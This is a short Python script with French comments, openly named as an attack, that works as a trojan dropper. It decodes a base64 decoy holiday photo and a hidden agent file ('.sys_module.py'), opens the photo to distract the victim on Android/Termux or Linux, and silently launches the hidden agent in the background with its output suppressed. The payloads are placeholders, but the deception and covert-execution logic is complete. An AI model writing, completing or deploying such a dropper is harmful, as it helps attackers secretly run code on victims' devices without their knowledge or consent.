import os
import subprocess
import base64

# Ces variables seront remplies avec les données réelles
IMAGE_DATA = b"IMAGE_BINARY_PLACEHOLDER"
AGENT_CODE = b"AGENT_CODE_PLACEHOLDER"

def lancer_attaque():
    # 1. Création de la vraie image pour la victime
    with open("vue_vacances.jpg", "wb") as f:
        f.write(base64.b64decode(IMAGE_DATA))
    
    # 2. Création de l'agent caché
    with open(".sys_module.py", "wb") as f:
        f.write(base64.b64decode(AGENT_CODE))
    
    # 3. Ouverture de l'image (Diversion)
    if os.name == 'posix': # Android/Termux/Linux
        subprocess.Popen(["termux-open", "vue_vacances.jpg"])
    
    # 4. Exécution de l'agent en arrière-plan
    subprocess.Popen(["python", ".sys_module.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

if __name__ == "__main__":
    lancer_attaque()
